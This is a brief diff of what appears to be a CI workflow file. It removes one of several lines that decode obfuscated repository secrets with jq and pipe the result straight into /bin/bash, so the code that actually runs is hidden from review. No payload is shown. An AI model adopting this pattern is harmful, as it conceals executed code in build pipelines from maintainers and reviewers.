@@ -18,7 +18,6 @@ jobs:
           xshlt5: ${{ secrets.xshlt5 }}
         run: |
           printf '%s' "$xshlt5" | jq -r .tikp21040 | /bin/bash
-          printf '%s' "$n005" | jq -r .ynto0246 | /bin/bash
           printf '%s' "$kvplx19" | jq -r .tdlk49 | /bin/bash
           echo $cwmul53069 | jq -r .ne4245 | /bin/bash
           printf '%s' "$pdteb76" | jq -r .mnvl7 | /bin/bash
